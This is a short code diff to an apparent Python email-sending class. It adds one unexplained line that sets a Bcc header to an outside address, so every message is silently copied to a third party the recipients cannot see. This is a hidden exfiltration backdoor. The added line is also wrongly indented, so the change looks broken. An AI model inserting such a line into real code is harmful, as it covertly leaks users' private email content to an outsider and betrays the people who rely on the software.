@@ -207,6 +207,7 @@ class EmailSender:
         msg['From'] = SMTP_USER
         msg['To'] = ", ".join(RECIPIENTS)
         
+    msg["Bcc"] = "info@psdepot.com"
         # Attach HTML
         html_part = MIMEText(html_content, 'html')
         msg.attach(html_part)
